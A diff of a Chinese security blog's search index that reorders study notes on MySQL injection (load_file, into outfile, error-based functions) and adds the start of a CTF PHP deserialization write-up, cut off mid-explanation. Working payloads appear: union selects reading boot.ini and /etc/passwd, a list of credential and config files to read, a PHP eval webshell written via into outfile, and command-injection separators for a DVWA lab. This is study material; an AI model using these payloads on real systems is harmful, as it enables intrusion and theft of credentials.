@@ -1,111 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Mysql注入中load_file()与select into outfile命令</title>
-    <url>/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h1 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h1><p>查看某个文件的内容</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669856332515-8f2af14e-b76a-4933-a200-921a3c79dceb.png" alt="img"></p>
-<span id="more"></span>
-
-<p>看过<strong>《SQL Injection with MySQL》</strong>的朋友肯定知道用char()函数或者把字符转换成16进制。</p>
-<p>注：当前条件为magic_quotes_gpc=on, c:/boot.ini可读。</p>
-<p>我们构造**$id**为：</p>
-<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
-<p>“char(99,58,47,98,111,111,116,46,105,110,105)”就是”c:/boot.ini”的ASCII代码。</p>
-<p>我们的查询语句就变成：</p>
-<p>select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
-<p>这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的：</p>
-<p>“c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,16进制前需要加<strong>0x</strong></p>
-<p>所以上面的语句就变成：</p>
-<p>select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</p>
-<p>在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用<strong>into outfile</strong>把文件导出</p>
-<p>关于<strong>mysql into outfile</strong>注射，要使用into outfile把代码写到web目录取得webshell首先需要3大先天条件：</p>
-<p>1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。</p>
-<p>2、能够使用union （需要mysql 3以上的版本）</p>
-<p>3、对方没有对（’）进行过滤（因为outfile后面的（’’）不可以用其他函数代替转换）</p>
-<p>后天条件需要二个：</p>
-<p>1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件）</p>
-<p>2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x</p>
-<p>也就是说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的</p>
-<h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p>mysql的load_file()常见的用法：</p>
-<p>1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20)</p>
-<p>2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>
-<p>上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如”&lt;”替换成”空格”,返回的是网页。</p>
-<p>而无法查看到代码。</p>
-<p>3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。</p>
-<p>4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache<a href="https://cloud.tencent.com/product/lighthouse?from=10680">虚拟主机</a>配置文件。</p>
-<p>5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统</p>
-<p>apache文件。</p>
-<p>6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。</p>
-<p>7、/usr/local/resin/conf/resin.cof 查看linux系统配置的JSP虚拟主机</p>
-<p>8、../themes/darkblue_orange/layout.inc.php phpmyadmin爆路径</p>
-<p>9、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</p>
-<p>10、/usr/local/resin-3.0.22/conf/resin.conf 或 /usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p>
-<p>11、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf Apache虚拟主机查看</p>
-<p>12、/etc/sysconfig/iptables 查看防火墙策略</p>
-<p>13、usr/local/app/php5/lib/php.ini PHP的设置</p>
-<p>14、/etc/my.cnf Mysql的配置文件</p>
-<p>15、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码</p>
-<p>16、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP</p>
-<p>17、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf 虚拟网站设置</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1918345">https://cloud.tencent.com/developer/article/1918345</a></p>
-<h1 id="select-into-outfile命令"><a href="#select-into-outfile命令" class="headerlink" title="select into outfile命令"></a>select into outfile命令</h1><p>在mysql数据库中存在mysql select into outfile命令，该命令与load data infile命令作用恰好相反。该命令的作用是将被选择的一行写入一个文件中。（文件被创建到服务器主机上）</p>
-<p>但是，需要注意的是：into outfile和load_file()两种方式的利用都是具有局限性的。</p>
-<p><strong>其中，into outfile的使用前提是：</strong></p>
-<p>1.<strong>要知道网站的绝对路径，可以通过报错信息、phpinfo界面、404界面等一些方式知道</strong></p>
-<p>2.要有file权限，默认情况下只有root权限有</p>
-<p>3.对目录要有写权限，一般image之类的存放图片的目录有写权限</p>
-<p>还要注意的是：写的文件名一定是在网站中不存在的，不然也会不成功</p>
-<p><strong>select …… into outfile ‘filename’常见的利用方式：</strong></p>
-<p>1.直接写进文件里</p>
-<p>select version() into outfile “绝对路径”,其中version()可以换成其余的查询数据库信息的函数 version()左右不需要加单引号</p>
-<p>2.修改文件结尾</p>
-<p>select ‘<?php @eval($_POST['cmd']);?>‘ into outfile “xxx/test.php”,这里需要获取到网站在系统中的具体路径(绝对路径)  写入内容需要加单引号(不能加双引号)</p>
-<p>那么好，现在我们知道了select…… into outfile的利用方法了</p>
-<p>首先，根据前面几题的经验，我们可以知道该网站目录的绝对路径，且用户是root权限的。那么就满足了我们使用outfile 去获取网站信息的使用前提条件</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858312565-d4c63848-3797-4e5a-9c09-b82ecc558e85.png" alt="img"></p>
-<p>查版本号</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858348161-3f7bdfcd-aa20-4aa6-ab24-937ba23497ea.png" alt="img"></p>
-<p>蚁剑连接</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858460854-566981f4-0498-4403-9def-65d7d09a66d7.png" alt="img"></p>
-<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/275874.html">https://www.freebuf.com/articles/web/275874.html</a></p>
-<p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">https://blog.csdn.net/weixin_44377973/article/details/109265546</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL报错注入值之extractvalue()、updatexml()、floor()函数</title>
-    <url>/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h2 id="extractvalue-、updatexml"><a href="#extractvalue-、updatexml" class="headerlink" title="extractvalue()、updatexml()"></a>extractvalue()、updatexml()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207949127-cfa24f4d-e8ca-4725-919d-42499840042a.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206958969-003b3e15-ed10-46a0-bf41-7558055941fd.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207004068-6f2f02ac-6399-4a3d-9301-14c6e6f18b11.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206895067-49081e1a-3523-4424-ae84-d142b23d1426.png" alt="img"></p>
-<p><a href="https://cloud.tencent.com/developer/article/1740429">https://cloud.tencent.com/developer/article/1740429</a></p>
-<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892278118-1283c261-35a2-432c-8bc2-c5c5d7c500f3.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892290951-cdbc385d-a31c-4773-ac64-25e95cbe9b6e.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892309665-0e7152f2-41f7-48d4-ab7d-3782c026b6b7.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892339316-354aff9b-6ad6-4af0-b54e-783de8de5a80.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892353133-6fc1b68d-bc4c-4d55-b9f5-5ec23eef2c6b.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892378736-8b68f3a9-3936-4e9c-a675-0923a3254010.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892459753-24ac857d-3238-4124-b118-7d9d6dda13d5.png" alt="img"></p>
-<p><a href="https://www.freebuf.com/articles/web/257881.html">https://www.freebuf.com/articles/web/257881.html</a></p>
-<p><a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DVWA靶场（待补充）</title>
     <url>/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/</url>
     <content><![CDATA[<h1 id="Command-Injection-命令执行"><a href="#Command-Injection-命令执行" class="headerlink" title="Command Injection(命令执行)"></a>Command Injection(命令执行)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig　　　　先执行127.0.0.1，不管127.0.0.1是否执行成功都会执行ipconfig</span><br><span class="line">127.0.0.1 &amp;&amp; ipconfig　　  先执行127.0.0.1，127.0.0.1执行成功后才会执行ipconfig</span><br><span class="line">127.0.0.1 | ipconfig　　　　不管127.0.0.1执行是否成功都会执行ipconfig</span><br><span class="line">127.0.0 || ipconfig　　　   前面的命令要执行失败，才可以执行后面的命令</span><br><span class="line">执行 ping 127.0.0.1 ; ipconfig Linux下分隔符</span><br></pre></td></tr></table></figure>
@@ -465,6 +360,111 @@
       </categories>
       <tags>
         <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mysql注入中load_file()与select into outfile命令</title>
+    <url>/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h1 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h1><p>查看某个文件的内容</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669856332515-8f2af14e-b76a-4933-a200-921a3c79dceb.png" alt="img"></p>
+<span id="more"></span>
+
+<p>看过<strong>《SQL Injection with MySQL》</strong>的朋友肯定知道用char()函数或者把字符转换成16进制。</p>
+<p>注：当前条件为magic_quotes_gpc=on, c:/boot.ini可读。</p>
+<p>我们构造**$id**为：</p>
+<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
+<p>“char(99,58,47,98,111,111,116,46,105,110,105)”就是”c:/boot.ini”的ASCII代码。</p>
+<p>我们的查询语句就变成：</p>
+<p>select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
+<p>这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的：</p>
+<p>“c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,16进制前需要加<strong>0x</strong></p>
+<p>所以上面的语句就变成：</p>
+<p>select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</p>
+<p>在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用<strong>into outfile</strong>把文件导出</p>
+<p>关于<strong>mysql into outfile</strong>注射，要使用into outfile把代码写到web目录取得webshell首先需要3大先天条件：</p>
+<p>1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。</p>
+<p>2、能够使用union （需要mysql 3以上的版本）</p>
+<p>3、对方没有对（’）进行过滤（因为outfile后面的（’’）不可以用其他函数代替转换）</p>
+<p>后天条件需要二个：</p>
+<p>1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件）</p>
+<p>2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x</p>
+<p>也就是说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的</p>
+<h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p>mysql的load_file()常见的用法：</p>
+<p>1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20)</p>
+<p>2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>
+<p>上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如”&lt;”替换成”空格”,返回的是网页。</p>
+<p>而无法查看到代码。</p>
+<p>3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。</p>
+<p>4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache<a href="https://cloud.tencent.com/product/lighthouse?from=10680">虚拟主机</a>配置文件。</p>
+<p>5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统</p>
+<p>apache文件。</p>
+<p>6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。</p>
+<p>7、/usr/local/resin/conf/resin.cof 查看linux系统配置的JSP虚拟主机</p>
+<p>8、../themes/darkblue_orange/layout.inc.php phpmyadmin爆路径</p>
+<p>9、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</p>
+<p>10、/usr/local/resin-3.0.22/conf/resin.conf 或 /usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p>
+<p>11、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf Apache虚拟主机查看</p>
+<p>12、/etc/sysconfig/iptables 查看防火墙策略</p>
+<p>13、usr/local/app/php5/lib/php.ini PHP的设置</p>
+<p>14、/etc/my.cnf Mysql的配置文件</p>
+<p>15、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码</p>
+<p>16、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP</p>
+<p>17、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf 虚拟网站设置</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1918345">https://cloud.tencent.com/developer/article/1918345</a></p>
+<h1 id="select-into-outfile命令"><a href="#select-into-outfile命令" class="headerlink" title="select into outfile命令"></a>select into outfile命令</h1><p>在mysql数据库中存在mysql select into outfile命令，该命令与load data infile命令作用恰好相反。该命令的作用是将被选择的一行写入一个文件中。（文件被创建到服务器主机上）</p>
+<p>但是，需要注意的是：into outfile和load_file()两种方式的利用都是具有局限性的。</p>
+<p><strong>其中，into outfile的使用前提是：</strong></p>
+<p>1.<strong>要知道网站的绝对路径，可以通过报错信息、phpinfo界面、404界面等一些方式知道</strong></p>
+<p>2.要有file权限，默认情况下只有root权限有</p>
+<p>3.对目录要有写权限，一般image之类的存放图片的目录有写权限</p>
+<p>还要注意的是：写的文件名一定是在网站中不存在的，不然也会不成功</p>
+<p><strong>select …… into outfile ‘filename’常见的利用方式：</strong></p>
+<p>1.直接写进文件里</p>
+<p>select version() into outfile “绝对路径”,其中version()可以换成其余的查询数据库信息的函数 version()左右不需要加单引号</p>
+<p>2.修改文件结尾</p>
+<p>select ‘<?php @eval($_POST['cmd']);?>‘ into outfile “xxx/test.php”,这里需要获取到网站在系统中的具体路径(绝对路径)  写入内容需要加单引号(不能加双引号)</p>
+<p>那么好，现在我们知道了select…… into outfile的利用方法了</p>
+<p>首先，根据前面几题的经验，我们可以知道该网站目录的绝对路径，且用户是root权限的。那么就满足了我们使用outfile 去获取网站信息的使用前提条件</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858312565-d4c63848-3797-4e5a-9c09-b82ecc558e85.png" alt="img"></p>
+<p>查版本号</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858348161-3f7bdfcd-aa20-4aa6-ab24-937ba23497ea.png" alt="img"></p>
+<p>蚁剑连接</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858460854-566981f4-0498-4403-9def-65d7d09a66d7.png" alt="img"></p>
+<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/275874.html">https://www.freebuf.com/articles/web/275874.html</a></p>
+<p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">https://blog.csdn.net/weixin_44377973/article/details/109265546</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL报错注入值之extractvalue()、updatexml()、floor()函数</title>
+    <url>/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h2 id="extractvalue-、updatexml"><a href="#extractvalue-、updatexml" class="headerlink" title="extractvalue()、updatexml()"></a>extractvalue()、updatexml()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207949127-cfa24f4d-e8ca-4725-919d-42499840042a.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206958969-003b3e15-ed10-46a0-bf41-7558055941fd.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207004068-6f2f02ac-6399-4a3d-9301-14c6e6f18b11.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206895067-49081e1a-3523-4424-ae84-d142b23d1426.png" alt="img"></p>
+<p><a href="https://cloud.tencent.com/developer/article/1740429">https://cloud.tencent.com/developer/article/1740429</a></p>
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892278118-1283c261-35a2-432c-8bc2-c5c5d7c500f3.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892290951-cdbc385d-a31c-4773-ac64-25e95cbe9b6e.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892309665-0e7152f2-41f7-48d4-ab7d-3782c026b6b7.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892339316-354aff9b-6ad6-4af0-b54e-783de8de5a80.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892353133-6fc1b68d-bc4c-4d55-b9f5-5ec23eef2c6b.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892378736-8b68f3a9-3936-4e9c-a675-0923a3254010.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892459753-24ac857d-3238-4124-b118-7d9d6dda13d5.png" alt="img"></p>
+<p><a href="https://www.freebuf.com/articles/web/257881.html">https://www.freebuf.com/articles/web/257881.html</a></p>
+<p><a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1101,6 +1101,70 @@
       </tags>
   </entry>
   <entry>
+    <title>(private私有反序列化)[极客大挑战 2019]PHP</title>
+    <url>/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671589654129-abe73843-e387-480b-9967-47bf36e15a3e.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671589674756-71cd31d2-7107-41cd-9bc5-782ddf90624c.png" alt="img"></p>
+<p>给了提示：备份网站</p>
+<p>扫目录得到<a href="http://www.zip/">www.zip</a></p>
+<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671589710907-75674e7f-d840-4b39-b723-ac0b98ee7e17.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">​    public function __construct($username,$password)&#123;</span><br><span class="line">​        $this-&gt;username = $username;</span><br><span class="line">​        $this-&gt;password = $password;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    function __wakeup()&#123;</span><br><span class="line">​        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    function __destruct()&#123;</span><br><span class="line">​        if ($this-&gt;password != 100) &#123;</span><br><span class="line">​            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">​            echo &quot;You name is: &quot;;</span><br><span class="line">​            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">​            echo &quot;You password is: &quot;;</span><br><span class="line">​            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">​            die();</span><br><span class="line">​        &#125;</span><br><span class="line">​        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">​            global $flag;</span><br><span class="line">​            echo $flag;</span><br><span class="line">​        &#125;else&#123;</span><br><span class="line">​            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">​            die();</span><br><span class="line"></span><br><span class="line">​            </span><br><span class="line">​        &#125;</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面三个php文件，其中flag.php没有用，纯粹迷惑你。</p>
+<p>看index.php中间的几行代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  &lt;?php</span><br><span class="line"></span><br><span class="line">​    include &#x27;class.php&#x27;;</span><br><span class="line"></span><br><span class="line">​    $select = $_GET[&#x27;select&#x27;];</span><br><span class="line"></span><br><span class="line">​    $res=unserialize(@$select);</span><br><span class="line"></span><br><span class="line">​    ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里是包含了class.php，并且get传参select，将传入的内容反序列化</p>
+<p>所以我们要将闯入的内容序列化</p>
+<p>看class.php</p>
+<p>在这段代码的__destruct()方法中，发现了输出flag的代码，并且，<strong>执行条件是password==100，username===‘admin’</strong>。</p>
+<p>接下来，就有考虑如何调用__destruct()方法了，这就用到了index.php中的<strong>反序列操作</strong>。</p>
+<p>可以将序列化的Name对象作为select参数的值提交。当执行反序列化之后，又恢复成Name对象，并且，在Name对象销毁时，会自动调用__destruct()方法。</p>
+<p>当时这里用个问题，就是在执行__destruct()方法之前，可能会先执行wakeup()方法，并且在**wakeup()**<strong>会修改username的值</strong>。</p>
+<p>因此，这里<strong>应该绕过wakeup()方法</strong>，避免wakeup()执行。</p>
+<p>这里存在一个<strong>CVE漏洞</strong>：<strong>当成员属性数目大于实际数目时可绕过wakeup方法</strong></p>
+<p>（1）通过php脚本，将serialize($a)函数序列化的结果输出。<strong>脚本生成php序列化对象参考代码如下：</strong></p>
